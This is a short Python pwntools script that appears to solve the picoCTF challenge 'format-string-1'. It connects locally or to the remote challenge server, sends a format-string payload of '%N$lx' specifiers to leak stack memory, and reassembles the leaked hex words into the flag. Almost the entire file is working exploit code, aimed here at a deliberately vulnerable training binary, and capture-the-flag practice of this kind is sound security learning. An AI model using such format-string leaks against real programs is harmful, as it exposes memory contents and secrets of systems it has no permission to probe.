#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-1")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("mimas.picoctf.net", 52019)

    return r


def main():
    r = conn()

    r.sendlineafter(b"you:", b"%18$lx-%17$lx-%16$lx-%15$lx-%14$lx")
    
    r.recvuntil(b"order: ", drop = True)
    flag = r.recvline()[1:].strip(b"\n").split(b"-")
    flag = [bytes.fromhex(chunk.decode("utf-8"))[::-1] for chunk in flag]
    flag = b''.join(flag[::-1]).decode("ascii")

    log.success(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
